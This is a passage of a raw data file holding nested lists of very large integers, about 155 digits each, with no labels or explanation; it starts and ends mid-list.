24797710061034706822006993271080906813684131972270736023813677544108415321507487648669490824605850694326893860043624033857160224150219304268296002195978936342, 32058354292771594548113669075893798075180450086632342404960978225036221347428429759785022163091231257267327707286609703138677481798876439707587311644678146759, 23977358627187650352437540494859285230360054540107796047750096548081711740517161637682245892028214634030312924880236553271501204972099053145911869173946912898, 28404238436949218763238162754951733926656397028663579077377433564948180702213035419361564511278304675818862464711512777880432030291022663290060949235933204025], [29758923798981137481902393583539843060385738337441455976439414197247981894984938626587031049449428529106041723066733166156054706078043936990308199445681533578, 25314306728076130003469622864769461146784174613057249404787628035952108549025262212286858230802800334441069045622158772829153310760822135907993112966602802797, 26302967100638915446414522362072352723169856606139949102454540910518523859567073202152203641511591764108089891286889964757532785428342526665760094182816928174, 23378436111516186611626679206380951462766711983205709818617469785958078553256358411896111940746183750211976918203653193271460530613835751607170971442721875521, 27337462824754761939137107164275944185595302830767949824893317656627380041894816772374890957869431638975827277750748066862292166015397995378856874020347578621, 23396323006568764860774905740246861150445930059148115166080036432229068916805082932825264677653761941326344482387769469994267896900106267967986093857400506437, 29339754155388611375270466264487349122512834317747812309065603557412616141295219371987644362921958159681836109076499829660907645954122748000400165224167502000, 27971285320547714659297097078604913440096910333048670403055908709941471305559475807371902539641943288858584652495341146798784053909096349455554261853473996843, 23297238538149340504462223157547059496213117130292275678283704814420662342929285345685910182340758232672918206303905769312272167342950743179075445688794586844, 33992912640827768726242218515791467461965735308668253138780129955438230252606950858667118847269731091385122320231309307755186738534500947382596592182867327739, 28599969566079309093807052294833698490238898961523874369404881547177865825961785031151152191080458766283878456159202333017720715228620984052747325574833171585, 25277698951983160327076721608299750420951362268303534808161751843490738087099985832784453052989342299449131812897938183994986994615283476487075362880401221443, 30836483587152693480673214418344251264995164838706447252231122876882673339853596188640267289256997562766154366976551769297292675562398215563345843338787194067, 25444495209382811749543440798912909939654913751394932669065392419713649461847241316167724562504685208495462508169676627340972400161863194093365650340339227602, 26039797741229235040812779113269381371816121514194487398665345887966238279466512286890378989579485639317730263908155834108105614440815263648561642046661139735, 26005938678709914987388946103581973327602521103455773515192860806597516913941961368179200236554733885797354366901978157540581009531153388526496852026128584094, 31081448496640744115504902687202813240814226926760805803313614136461703805525734072486163694622169492351504415898333466835566279681016570862173113581724231149, 29643721399923854156304944622466621299307520293986535469241531907647776716020694276349287101345158235172064864117964356694559789241921108504442737084982389371, 27494658052466166559350525573740928970524723629238812286049000108436865775184805248214319101364109814764970390804037834923588531097571670030056842778485847820, 23722845637458013334947728869473059810946979489129463252182824954694798534485083359168974537981926861955800914378828693184823928640290590358660601802778523136, 24809224622440642003865814946297211641982860930994730098131368433826980728903753668110685027747442161881529655758643100672957146638688242037619902270421832629, 24131204366890410074298517682551718982299040477709001686149617738782882181061301720992182858308350329913848492824199022688138659919184694629289812743984695742, 25219034957824968432868442436391265401561720507166999805547935307955589877538627524010147702884973945479870815432303444758434563464716386323013162124869860803, 27345288882902618203622551513011174463121824866501575629778880628941147753990408742343439322006532438206897425512939678149445497535504071197470921270996896701, 28606723883497032578100908310939864822438988231184382207675412330360067031323475327052183858729178332878862122425104356835143541069734760989756024014516064175, 23873842091613346728808934100876216586867952898075169967000990388767655147939214288004019610562897489324323609082870013800285087998880696547980935989795898304, 28608260244626655848122795054556383263973430178122155683848295239835873328281444466587826296452586863810997351713983761938490167707040036421348929106009272796, 29106879548162961368095020835517517213214153965295299484988487974269350080153056191941036218105361676344368231435533480153182296074816829015505400635973058732, 24649335945835291978194521728951407556247384345790233360462026231119923775711554651149210465736762803811651056202161152155592575862990692425895898775063933252, 32033142209898523527745881597657993559201898405793039982543647025911177250558930295554198763707649583853012679781428092425895317410895790030586396115011677297, 25014848507556020666318385376777436923472348478167165851049986339078823828662117836626715014096724682726669139734285058430694807200743393072080898121198591961, 27360274692561492318216456830090686123889685621934792896267146278689150038956595373433039242768440832112499086645703785004730929312143268454443616077034950779], [27448100215972479593425445756551358658293656151706641089984810686311150792410963176854773518249541191724510814651507214825537209929223402994807215663867392704, 28598288371037119461135022958243352392614012523778794703994954413786082027326122083177009092850511496077521115341287738567159070302475020860986277167627339869, 18430189624941343667459085910262393930797246499132220815676103906565235948672043696503326371480319751600565790861261929537120000235938067667416639151225164193, 22932738774353617084415570147075897672246092776515409953920930322324619709178837679227573567464880778593703572924488984675506537986110973110079786317251234702, 29273765337091651207616582381667488685813700997433134845046180479359062150631804180949247957933090960816536892524939319992727467976885351185276966674908124700, 21633102557528223258826229208302865262927241545189718049999402350097615951297327900255501541147698820436578606566166230028452866084066068540670063412499337771, 24707778583974502598850397037970469727744761638759498323965586227877623045324274918115412364531174180511852327457761672260087213099731143453071040779307526756, 29282007230057539437958787777656089528612392008191070373758760552798828529952037505105703574232717570327281440121416325222969814359632812371507534597360956531, 23022453029870779019153289783121916228675467703472793564479982640984356591622809590005608976776071774493833565886447971217143369875170263430905557207557241284, 31195385977231555801588943043058742818566446182562084058430485974752804971528804912581808833837703946414055492832183487819891795406205039154296782083588455836, 27939033077025536947444857329437444359280664011455759944021312067789493763095350780808207985601892938491724250170081041675117331901637216233760343314977819960, 24421634269679853274510183078147832809219516650537682665467470046637107901273052066343810354936208598983257406423381288241698634680461668476862507027530810086, 25732381064988175653904301962087002942927858266653691572672966311267664381937753592024019555254310767238535875750594004501374017439769897093095754466312261762, 27868728695007603928958853396249228141134168777806491716709657898611119720364878677610982071944002827466075937504507634479352937120942443651338135511522185818, 26443356980351860880186006347114601297130563529855532963657997951454575790605490993506274149223285289894692605046566301207160220726999196623440286585095036860, 28354051610895593689749260128445606408091380868939834186762008551609822379979598487368378176624249866886200234753662150519875651573876300273433549878297684929, 27727218944513756641117846616386007599174094085370559745254700182630537496732421219857039208961272367777060757355162189187626922940928217691203090714714727225, 30274990160370619763208968348996577869038129502599401305382094205400375193942696169688518935069647484852183331332697434376630619673193620342100868656382415424, 23951019347287811285746992093575829230479728620500032629839287144675238895053831288250933640255026159830483980650303038915097403707615738635991044565091783631, 24644821633451878126211696580311910412469680323372377644415092481968115857975098949794341844938124834832707190581470862239880510983414260747921326383517370294, 27299604936508649903605924844816620226887659755536486685258921814743468215955202659940087608822524233785074007068152677899362882687680958588356177229608476816, 22912592896352898293950355484178023502927594589075414865324052803064812458115466951996922255193852077256959659059909329738637981393401807630151075465289291472, 22571439057727556744142554837136354390071144186901879169767653531697221491328429053665274590574555224234515052714462115052124713081315585377771614730375725743, 29777932555309589728384284055017523555292878081038681821286747206711845170452842278593200795756229669492505879867117301094291968457311861440996687017694213155, 24852873485376361862346628370399916330522746053005734252445124433250248660839241794638768233186428288058633366462736338602346779340985091488244402819840525990, 24482744936190776322757198441620503212314418515300236289182972467194761271238026990670270876467396386353244606520991459563201341737585885566349163483044305960, 27332505328449649056772171082052424370719999349987342126737247842399651082662880160436987388477948115526177330770355924253477391240011722608946848508017683904, 26832301964700744029757900642002270806431376601769103358426041470419756034140209130720182326035848318517594780181483775450470447480968157600499543121559943304, 24406591623458095612399512303584982482414474803209486992489683331746275440947252938619159864534550066421025362234079777939367728146855543714359394678290973035, 30908456991192130345736567833374189363882431104970428832086076232692428403056981734537784602168428267411989877668149475761970781957306084168636557554333256359, 19826509393651569684290307462799631510769005030283100993012571200296197846369517947490207458654224671091327880456337876408110192709225275010247558555249564893, 23601902837484205439635356195167079344283532711723738003330373276754798868897450886866002268089586265858968547439557091838257920070589643265730527908402475068], [25406586377601919303957167954158062249594176684952118769882498371524191891108423400206140051587705038372065787145961656877283653527759371413654574545089445567, 19779262024856678323242911143514369863381432347988299828467051044200754609760197660137306806695881358261424719369026545055346146963530811445657640532591914241, 20637988074283463867421984374757923225057948270992503380142517895754438585150668418243129963704083934211659763000177961602462419104957262542012743292086687632, 22452488700440546860407023011902404581660762540563705756085426398859525403090363434991411131614943084882277099470558790959525768582395920332170232752040125615, 23890193722599267867079634858797452325646434538541801536037483299126875168303763790633864136166324223829712077378305673371794274233810924750568696830103078048, 20363237109358634631815873054537431309530959110847183930602329342794540671472052725019343595265014831009014696427873413034687968546327435900675539229725582209, 26642009855396093430513856632101773550514477273694406153984549823905672877700522362504429905185148378305573388937788197458641758684254595946621499484861172474, 25171594307686581648890997242067228874397815816340607174336620412658686490832975650453694277245493615061722250388275804727562716205535391468776253585729711158, 24102769330559088240761558567336227856039885816978319451279404214601432678993259395353233420064374832114889996165043164260757367726186811235873833168540794696, 29474338664910700936958279451181461899101168838821995010017630157964583775997706532832539039201172990634405156072213398251820607733521053694905412538648208930, 29072163578033449135913491497433450931080899913039013666902798660704818509154979193460459674859204417505646133181993126351710197707198767400412608542916665855, 25545797332957174936502483289816280565077720620570445355931103381528611494368332436111469346578383461593457827054523149659584753704475905119966263594623189437, 26867002696224316043266992983774579290551435627264451823758717846006697690599934946752659233832338331439851679076519611508573866489644140792545770779746562685, 27450962633386026142232623869325680316693441996176389012899892021647988840696965923130954846314546143644893881011439489304254940684286424057970155335977755314, 25953801966080917459338823558075576195298532557155096169677113161069947223854473463190856712318779653651671652688684248011303601221857165439226324355449807952, 24638424309064249959924300401544802938667490819699587151488910578176046503462340543647540783536064654050000703730489634503491075887445656516394230093548095294, 27666440961432185280181497467776542329161748725180331403660323565738782566206719013198973317156731576134445949708280922559070585147367493155529161161693507010, 26940110352593788414632555530078214300333523791139292032284799318015094204229737701971839518704417973593547383202216029080455348764319456738818501001679840067, 24683435597161364577669236017739220682479182061253441750485704955649791273610776057630906883972518277312168687730388514179403104971858268043257749382446477822, 23091159600674001922962536433877835981481674981169491521394960299284215473047187212997457149128286683398982404576318932952605761738433318614215946782074955451, 21181515983202350193498016093173937576812783310804252011632389969395433622115814322127809872328119529289799670015460534398292267714385389527173378917171504833, 19801813569863095568349587040304133864830495296006992890373109907421757980546879892650505636890126063757057285647620178031769251884599893613172292665565488489, 23547842581981412605488064736671188760627280445620908663606077628986862766469560744459861094015357838342006065422292168143360660333975010011983647756076615889, 26311585710075303251526113692042197683760297064313775771271459917321075109636039843732336497809991807623683860938750497556698991638891340908912025653222735266, 24324291792182471480374669359715194824711907562370408257487142088167639971890541540197834159183634179896700979976709430337732615480828887612858018222223044778, 24035217925320917773995053059839744886164304306150632158053441510529164695096838251583475127142784737008237556452752153007940499687595887776061801590901406132, 27138872386827402924067858601040495534329243481613110524793493134431856527717873417328167372827317437408764800456804036079408572925855903333182339800292474425, 25927177804821873140821901566506634426273954966149378371230835392587338910451603312104853005225008541453953913942723427417696775207331589768772859040649077622, 23357145591606455939048942569487263142674610229188076335434705493285213568943177116808810517841894088157398898282454694939852702510626997787712841121539582356, 31981218569381142151717089297977247435246325905655202508622478246234826090317815619364611936896277462425492092399240490542682831229409965000498265765138621671, 24474828285155520691928389211763449188391603637193540001093615535912316279218419076865120840138142234449705140063559838571832669696251520531619780947536645288, 25934030452646496374957952764474623011635467325643674001173560166856389359300261437665206805238340344703178429405296181763196535514795140979829500588840456370], [23646135853877571708216817788646085237221340838305917591637579529678853883730723663117632655810496598136285361111158285817384256456523397425806177619260659460, 19028301608291735746120227990539640499865757849368846671478884983961993179642853657424178570128011535384606042950660494269531111928878804352286381715937097432, 16917475634870988045229110344316755841655372896576003363278764045626643576513602158144849798773390412557983699335586407095874963318362108421193748647767632273, 18308119217013831510289843621120939866344858775788711411492448939908705905398761932064301181262025972619148702545981936741054065979296028261821071823195698618, 23118692120162664891446198048406187221907114981930340060454580959115319178794521286261170020228815301895930919836312654881894142044116237871433844393736483029, 16299725133532278901537862887856821837393386712988101686561630034749189222600292569123786169709446455322329696264199247018422742113393968596398654423922975500, 17947857047009911578509148057994992608358042088347799478097151816851091779435992767490873668377392369827582895240863872369178738285431675917943920681708977530, 25373835625344482227008727825661098225671179160381280547977109782584931733923827845566298481947180929441754522955399296424101552460767621363460829148643860356, 16985357693426310625795022759480097789681621341890030904740374424266816454604833765491141398776998461744543610128659426809488691135335387542515919561733556446, 25221891609582469389105256326466350673939861269445950675662401890436444422959974933296818140702428425881173601306726118935579033597247760538998441737511411817, 22514196801146063966349299664649246770683824414894178111820488930363432171971851171535723905917135561678232358203943277865120568283305232346197531819534182244, 21488885934748063834277422512685062981999505678815869535512852916144227873950708967900978147007418566378729338828165444760047478693656524948965325073003876454, 20222338410982237999821587922071667770831771843481327486887338303664253666927517217862019921605582013662131630222926606282621001114667855962568070955962891348, 18758774518509368016238294590517007687880310650902580796031739186917617920664332319903602714388207676165389294413696647919967935677697329428233311322467373723, 21843130210104243746934059549484150678306133062475370429740849792468807190856972363609662190424086629531832510853352196866643979442675368837767054031948439021, 23053119703564605388832199532111453471189590592663670375347790219371711883697789954669715397965863975521417634137531251502322404935559399929924142345413037331, 22475026394210912831130600462774448786511495648616517571403849519579935510902140592437558182630455239275599735626229123517337316491337489019276272411398324767, 24635246509819619512600763747191498512770626984792636847811443907414514603950836699134302522682610249968642244257027470813242235284667210992765400578538555302, 19296567491575114744630470479354450111003732111252549667688377813243999394656798646072165040234700159741147512681952085556451201347581342728414566785689095287, 19573614291572122102400418836869438247688010793073792094199730336537653696284003134550652297910895187478910396551416819792332133392059262308743212878814035545, 21225663899160692449005360202435403302959074678385114348054462576302758972487467846732344657587502307255748031224192126860090567492294255061518379469006790410, 16010799777727213811504986358053394908572030497527076523869336114454344045364239458765760019182509651474134125600762589461023815801922210250350318106191712702, 19632195558625006342444770741427548392229825201980630356706059916123279672614822034618703901335365107885956882721101692776174239142353259796969357793316216073, 23012352432089664393786517302256676980042067707435654372755308047399473753569060901704520578796180791035610015357975718047409737347935203002515423258331706298, 21030791036416544612807818356673946310814871849425890004414680095952883385447965625956161030401836087532521044671923153712813361186697778926210342929399990029, 19960159200979184254185701855439066484775959969312002452779622410365556605029140627287260203555239200594491635840432132693961684136127021320047929681670986878, 23629768720309809893708931132118857873611663711776529609765786951083505788123341601673033850084675760862357070700456828996980408072047543216129963371011867557, 22469652019641162489680926388845053847134508446297220363395622000458185167027028777621622869683703145909070771900060120367439649109758661941145643009205250739, 20995173398565516181288844569236051354423794415542617173676733809540792116103270490954496843883907821804382942244160399748100671284886154571040423973214320096, 25985217615213658035125916992973111332186195761558884700258390854303793770669430510607347890795774153123688948602733222885918927236505556602108911909805237250, 17144566671018140080394814670297932181807174099660210702854190296494091035473823863406309535379327376677998145489227560749609000931212083453298128040913437973, 19068216493830948120373466395249622256617439970745481484719387664580230942014693691534864933560884290604868210932256255748753702296720299140450796459956349714], [23733405191428368612534085768962720317596839899021090143499942110324686637647747183808313403728546384507173046742673204355630661478498909081444185577781179081, 23652924640588470569922874961916181761835436503738751372119904197587967924410930017923905660471394830604669904602358571622691288394429390934944272588319287752, 23812017679852092003375781402531660162186705965135939620910749145069579720806780248805515463816550575060201994697112286139073270370017700453892648508417076115, 23265363894773494238292485324597664098545231441357125905331853900121293527667984863501493970430047478472599634667366129513973939674953411339023954072474810728, 28276286716433380796644496163108065423762686466558517514036852008442383839872938729926173563445998248351365045226110761905594853378819517358640113074352711907, 21782924646072336203154747436836244318006486110258004259506318390641662477543512790061520326642447354278166751374682171959274172865823365699086038226210616782, 24265759826434148908020397834144223545472104693193006350180274417618474767691957754865493813436780860174650044984660438222033457790395998242784651401018415696, 29773594122958563614285629398154392637736614826397492664309521103946882459863647683480850269288412571076465830387241526120325150647057713953404005024867755789, 23176634530656755947709953353569438827902883339939471424715895775547310725022279751943222324920848822068834912248544286537362920000485257268129481734348229174, 29068143662982518706075769486063463493578149431869640476878056048347232098782322392081208881589103745359518649825125445805952763279727511154538584221041927252, 26161171115940190195882974863608767819037113390829054910471278190437914825125580987962006156301972825123368286046659739739372361326418213653576481675688818479, 26301172152055830555433654262260627364641383027296024431332656787800241443936257421585190274439135227749260145858951036929469106832946436545543973937077623131, 28946290825047211880179602969188328802110008481211670453654593442127922769180065310206825575298319882797801164702667658776852703147552554726624157820653884913, 22838697329280252336061894456001944528730548640267587892033921659394314790280241157092253215524002456075324368887067067946695059045571824072177503372571665857, 26581169446734798820460901926357117304071065876880712741995405071067933702901952610292472025684458812929043935763392845723604463907001912626567472277670832799, 27198554945077155213514092318649127580294527099770321567104914370409601783791433925251708004922649749222267717549265116649702939478901088403071150665873711281, 30838877637902468381336724475676138721614740681248370342480306362277469562855425291530961934277623477750383778835127721972777575621612074094387349113056188831, 28932889193313850967233945405514115596474814342313581440231595999249501558439463841185695390465502266763003700911237091613082061392535847004685576931581891322, 25586207926231032741547147314450205188318879008443246243825896425899129838259481781827907684330646435890353125241165055665718457536733233071855898263666733445, 26026926142486591441352667036081835129496027448649940228330865624224599020246140071302808056759629366189701876409937699248049174828908588521751394557360442336, 24635242620460514292283831707683991058339432111441378341391373814907890427725761875007079893441242685440269838783092213291916483486298358314563480019417730044, 22632486695828186517299840734652814396258652019381323197918466187297801176237890038083706297520449753605991281038552767067517567313229125412582864914728525650, 27500710039137030011015916414060662447314777628339123038336861588037719675671931632071821399028462123869139467386072664805400560252565897688271938700022211776, 26474234591165669858446099113431235917899930236358369589945876368198399605230983930699859315080741813656089568014266824443335471687625542638088226895535141800, 25282226082141071358896399289169417621189442379700036017750309700963673207276806690894957196450997081990834601520799650386216123541408020771265244306701111350, 23609278217514382216561150458502774668195653008293727775510781604635348720350396711079442344718689156226408991035504756242921267373929541414396868197591328345, 28246163727144520418833420027410542892129107968443965476173381377895075151985311280427726261704022465616336553707386881116832918605548914306971019369712635872, 26417617013180057694538639348539858716679591706632516512001629333390090591190724795341939452963553022985049286638457228824222640281809865142789104121269605944, 23871392732356900188625721460879304558847257090799370200567149816477652368190807351418903653645187841037612129447002794827077664006938403696713927111760814275, 30911846567254140254707354352672547969518576566818512367267934605341815238201536584308597179715080926761379279452989260784709324722316415166099208564487967877, 22616660693711940908211192244100698695027457689837825227630931537279071090612453072421936854877835530018934620235677531900232190791610356367886326055334986552, 25618839319466728693623231069747107172304429998563734338991708374424611246094343755651879295416415164181212363950696479417469495111905659679130794799924928990], [30748833512433323764330309275057496336377631226802740402509260377684948091488797440089539071362068050975495085318020809093654756477157784636514611658877321358, 30329087170563600954165479725305118524853555448161148117521735321686355713357925710716928299140530751935267581904307609930004773033758899136522091012244825007, 25463329319084504576482634208050011354833925791921630930412206797066176263994938550202961713104323285862889642812629817883505496930280725092407365821498183753, 28271609059341420019974803224338727323220901354872646716358608280746617663088323086647394496345179238328424767463207702066339539291007824340560917195527967812, 34495939961016406844219052973480384949721209561511252081184079834346819960712362550216210135914799535843673169549238819706667446254048400767201915122711618903, 25836191404331374259921687623475789186791216636392778768854333310158591998552525305129124574045591560766867950613519375049443651225521322498990543764684595614, 30035829177343163649018585350641202230115198604460934599107409985493112227756218022544459165611541832663255989427952872621749958624822386733749199704705956672, 32254016750120516300383451037430466232256591977617480704455403640273602933481190731045966208522796544329456124636069832148641466529024801506764922855200118102, 27200462106892314616072997520554535475771679771723953034457353796058104391940386203927470515264799846549197598961472403994190413811599637948577990380437097620, 36641646180950771433179450678214046407775731512624863025386548793218293579200088432913868080012712577984300865540645112047087523998496299117747766871764431632, 29048769609618672179129791995878900040971852401029853882438230470079845717149271166063359677046236640886059724373356256763973180151214821850688745821256912911, 26771126794846971005105988728819499929315793605261703441988414457243710867192792138359851076134407056628767639055782603885878606904018195215426750903704761967, 32073882724710001448815047546319864313527758466097079107775784156603165541403028476103659149272280758479849013905833378649554699201233035394981077942313468823, 30287269171591919036478672414369867977774632082886506482896359437507734486344052140131860442584466789941099385984779531337968449135764198768531108041453907349, 31466978488698123385992971812280601938772575408384316543633699169765587587027838233784642221400032776163491514482943490715084407184163303223122804047048247880, 28508756098864003666280995133843068586110208466280761892980894856190878304983467160884727750415575123903802397957868849728985281021794171835975961897285769333, 28555609442308801450556463305905942228021045703469415081244175307285506793746493390044037633838086242461783645348715457665868234368262542510408494328473005891, 36104871613797682770887391003689169143683774636708847779581354085779381216104976755843469544259440106956333837515563720442703777474903060619861053252557331344, 28411948579428523125571366485544504121656100955975028369213635275643625654898285801327811565345880185678617945329668427077242784644548761962968077629411079859, 26317536707841314602205644848636523874196954054496568644164254886893830537608267276880377932263185102170218771764496464058649666327621735840878816865223303153, 26487346126919073439079038812281603429326095307485566831431887578919577184272109816777117831044857006339701087767277559535814430313368211549674757494818072898, 28284340132537419726162332949272784387087061897051655182748520887973125125799060742810353241626507803505942767126626251179878866669842590812717363222627578342, 25217567696463694206542283476548654824329835272674229050167600413069553903680004272975289193373167220377100168017915605784869254559261702367122004053162760052, 30697984624013903535282607548878088849210766310469237420315395695414667110064266254343430899469183882090949936139871342469331211453435361307153002847410169890, 29314655527776459807685763104022232135119220529596181045087500568341439527795071580451055219895092885181280616302138200922267418064657672134128242935309947513, 24909462311123646279106351253221526212595935105936513545240383992922919705241694514423335175178821374388296902851021245957972148862457936166395926805712071937, 31635696171355139477604924663570210546227254647151617068140709796031784971008763719296108107201568086375961256166987541496983862700167718789055688959684531901, 30223479810601844158955307306617422351458657544122581112557075217110354292436211657991932211550127697912654592845979118802518794394146776991593991446451834852, 27352277185839709111475958328396944019698073189383778836972173737409220707055704394628154592680543190352741843500788313308885644312038347159011491782644232917, 35789727764197750205756273416822786588822742658998869023402376256551237085385203146256988084933856265147693643940976780176043803467955131761712814480842677537, 29281972574234408803554006954964576773919834639482208365705533509870269728074638130043361482177557717881538823591904827685102674452657689943281243204048495579, 29571226386011614388419313002964374725027036384712955562530877354933723030135447459975914094787849883941931085667636309266917150193196869469865578492082599583], [25043765282872405828527962007486529107980159197744295482933570480625931445902903243938696241425673953816981395243677615719124129823334865515201414074159723984, 22294100054451607381870885242361061915759726247750479330527750698758427507278911087455060947307365904033987049779983814631611358827932143844889712009313528612, 20204536134626887450280740577190823146507870685153180805279734819520743717762086318392077265600253719175210512505786918792045153162631128693235580544284413405, 25294286494194136601060677106654256771155057417053230538550701557390985109221266365352078990363973262665382819781523721434748246406083253415967969851738004138, 26803574528647760782590373138517100730486713575167103551318729269832872138762501580937637744819464541077528142755260797402779997426147548361373736097582864927, 20941566225234300567339379287981508941467040281737705570226746098553921203390641662941101548109242755100372050937243833679214873455532985516020562243907255254, 26775251524340281701732064250634994067119192556345612109923073641787763095448909673871602930690498037607249158898465988773375177855227090549984718532788861610, 26586727829137812584204364615226142272527717191053903415777689975400299236102528568067177047809967719809712012186544531019068115726058844521742914733684676940, 24973958663112118116176487213879605585583541927048486936647589195883726200324817657850065355815148145996986944129267707427002345054193404484074033694005783708, 27829009496381946592393722267977928384443900512948346104346806665654514935175327718740590020121149359322905729418071725406924611646256498168760475930653358801, 29271118479793851640193786935669998915947002471152450397661899266916748377777836324895134190078369677512227999966781153849108902798456866369900815280394847714, 26139093097134140957873179902166737957768373398389082470557284203546988963413918666610520560537420872111640869011091909858165400961599924165198747767703097657, 27093511011781196902405619750526381406831575993488710370729043027906470362985844460791780401232259790639211773416661246618425777243510862116888512760203295457, 26012369320393152587774942026657586237247822005876604751273211138949585179057373871326610374694976075288641618429999091259010629165847534066943614161463540719, 25641210858830547799625632456610273719055825499344068178467521686492705033367216921346123124311924988916617033211901646387095927485699618313724922408223049198, 26579007827659302619503019338047164913310244437378501225510732483238139815938765030862893685529770143822088239136817461787958572907380486302175958693194476412, 30186342008341498810755437918643629846817602361787448210630122851638452751844294064136185184518646691863079196172920950639784036344518495146679551209868850815, 28651759524695224441074331451633439755307013108304341117105908108794122639509400987168700401178499310726407165218090690934024228020406015326111724430478421256, 24087869062637112395643408870093708804020639176169499596648311304014309721440879053591725925422943640981620408464428508553278159721389759663461470514443037404, 24045492001284173743376415616946960289317770869635013949021932413167861376596696960114823971669582655033841488417456925712045026130419861638832823398113280278, 21587496658341343011312036294735154979319488308831454661714605352520136841629673676095738465684753214102221206601067075005741078759130703595943074964918944047, 21184731242672169782861937930332341076628718783919258654111602845767527983301543536989649232185927891412870655818231277217034228772857949499393217207414078668, 22486477472697832567994875645826635522098393698686060686432504742191709828838705072059325604403284455843429064786051433840136062274590695372177010971320156399, 27204073279480632998622190114128860963105992117164444910265516643937954675781429246009336432364982712346446987596477284288659728821186255002181055434146540049, 24452944099591154593412895570981140450022773884510204813560692849341279718082169321496442279405799688921044301118622744785541989825706997179393499431676244517, 22422121419885262568544097233945414356195226803236785489777210136858748432193700040694887573166626007559867738283823548862725000076045478379463442209182467208, 25643679547151130886125344852543882710839553588101171503610573642431293838427516949835891441690190823703716477174448458220882209102105454715161458772579701989, 25954706969095642919194905222491827547028847900939479902685800788920969361344587445674959735462453964605887565329429364376519194931962254750756518346562518348, 22683392231543319409246409706456056566216554811318260175767960844808419229286901474018463622236977505419170422100316544611134658937467672103356262450616676487, 30862526993742728248612284307565410065750918680692572079671119920049786483299596163361840164763886789342747016464072536084367771420586412643482492723639792736, 25003951647704165365210938079017261765610529206538963424828680135007669990437477183741447220834723662472402842469594742423180381210333296520408128540258665604, 25747350974729486206716563393054750952407323326265150326377434908186898558529558034229299739152090891523626143669037488536557286005346650597005748886184716170], [22142883486607105619141991719328920668040281892283959515921355015287823811442237797576061445881532232498248743094224853812051454665144729637952391407042727423, 20327719129751532523797294693303618952743926541485944870586745816851337419945216641496780250309565854872502190937688560707850565028784708231957724048569993393, 21735018043592842232025756981136626180593683934829131078129707670202826916822184363254328311447038041165771935196049150463462494692090326303206482638398016107, 21192683170289769668382106063831015893867287210475833269914610048466965953222095021695807747969444920208392833472626238429808185173507612696482773515069146811, 24974507210320562382662473966184803742842195101388945528374160610300732962026422100454756023486902415927724159636711979451936750589669326277557232790497895724, 18964239849367347073903421629237486558795379405494440773857555784836551718920634776967663883086539300117431159780249736175850493092163751948946883986120886491, 25274445099024647043969548685439047576069015576338679623915150511117082238295349300037236093137222803948260568216484529143205007375389520609056069208220678682, 26951443325514928770208276014291391722222678161262907056436322616793993788527057305659871124522549786303327850585631776974134692833818131439668510085625521488, 22583690902938294867488215864368371486146140921800997635212890160397235512525898347102012740236297389576557313771019489415904341633470462054363806867042084097, 28324789628822350648139704755165056541193215950840159278017425233858379955301035850788140034834610366570070400862732833720900066291355502689677501529682687233, 26744176994130472973834590941590496335251864219057932409352571655157785618919720463781596794990032922731512457627642732829151688358590475775401807091815447177, 23310421888967009526939089319162150113904682005855936380553845208312684566952032411447519267938678796604140603371700043180296506705172407004963661553047308021, 28156298958348642989423596434276879348097068052955899637472570067540714403762730976527394240745670777113458332795737982744930644020412996337498217772782076103, 20963875492727510125119442309998128067098253515646950453150422497314521239632724331081215270551573340808424233439493323227139117458353927013928713257542660077, 26972989730982697782062584995140654707199257189977994636685436947419339247775878453716127534205006031268803581135014665246497763576172101418721379090187604374, 26047190499342528893602227703339523522451677540329340994464647264439005150195552600511540224153989462189688015497984026967750459437395420335375347556619892580, 28582250257000298939602957059032212064267696784695155978796692951464425355168443344991790773784833826398777137124473598839423022846743478018983372259253556300, 28993082163222644173896938352854751001894386113920453653684083191961099397656310691447558298854303204871455804306082784314724992623233405259766028800850453172, 24399498871338526802542334916964643755853781919837914352175086001781677362696717957555082253244351772785990647922262841007055030535154291068277083293116765496, 21150908066669355156334392490774124103522598414776927177167993911015108016758939246705946748567728388208184755034177201500255681726794076412718607827666675417, 23052259592284945223395833711256007385940078775749254879192363655794562196029202199787025817570468139499938441839586855999786163085867710949862533709639042766, 22019064122111395171233829164282470353499293267677670163480564649933326662889317565804082275848460156510394600686040890165303623787962649686762358945549131529, 22353374493725618676105182390523271747224908505582249094782268272195685793857332753576317456462633773777663404130941636452141004496824221097019959572864988101, 25399833409631628903623533884670325604102932409891940389688500374215070705333659293506287994614133671070359895797766456649860732056355906930532725568277241530, 27684682887928479268259710994352515936380653501129377971116151548167511711925994303099038238807922194847601762796342594593253106109133964356150809243106183861, 20511675050592774220571328908960605587920497706633236492895663743062579428659423999349392001362501827505792345969975966789592380840805109966768394171830019636, 28284068656718919586331520626870474437012467373330292538999299249418967709026268083038079245722630662942847523442778351354686083838450726694636007744691723267, 25796511468702911459810992501514675429594114732409140270932037189454679391581396112519757654941628441252321259072304783979093199444315329210133365541829568587, 23702341201420808380883483272179853674782095509503020080122353255104595000863328729828200091020729221496492525147468336507755432857919055426056832670439570819, 31411253149326601229266207950986517215022896433920161954983825776230734179222206281777153853921936048739917400098140221331888064412445134518353222810320505457, 27774197949205751489027110278870191881434784699497025184502564948340298229245403319192587499232673367844408475219486964991405023835713456591781246023709173573, 24553394839746997389389097119111025364806837682049511614895247671510299841345923878574656217296137597172459950085661777201671894539513839616875354685907815724], [20186977883210100215541384005398968424423895680150413910101002532803415557556503418372218372960783388251803904087180069924943027705377178399291280353294371195, 23284411264173796515340447220576186733612689164517855275790828938626318837511202134496128324116132569378078416802003318273389893895081609610416733083544011476, 22440222011426367541470801018048541083196380750776667957895715215611432184610505513567890045875849707103205165017055538111526846584086791224060920800281324515, 24203426941774617160929469669328442064023426941331206040878246250051056408221761483889408657416193912034230085708700388703612926469768942100862562494128638157, 24625139009936475085549407394874396307697028995147957912400322970211144037131810868639453183868413807725043850557623171248868386122806657676565851316073359343, 18518453634427155522266488817467092532949585082934464028831661528991750256515494263833382406610275661553377923434430334876733130162979751869662956269065851000, 21388299585039714304069056888907907169024481534400723212836267556062810903138282566102059105833380006885869656150431174752943334588614067870268535947958879587, 24758720002317219427281871094870050056251033862179329070520608118319521140497126131697403173339199639891028912286601226722088697598362660113773368161070180788, 20013824607997089929176702997812020933397553019786314140808902585992004216976539127769445712646652702181099584469592601604050293649530883494814382499020284019, 26617467148206157431594890078117863900770757134790186679439026588789645642278117421874406707679212192809662607545559897011780814388219120767789398853327939529, 27046951315365544480386281013399736714504765205159519786215114675659977933741019873932844158885001470829786848831503874968737185417533500716546300663365865041, 26088530196765341471900595522371806679904643809238213529664211684990759106425893493928465882942241017657194834866473156012016690057271655853480826614104990908, 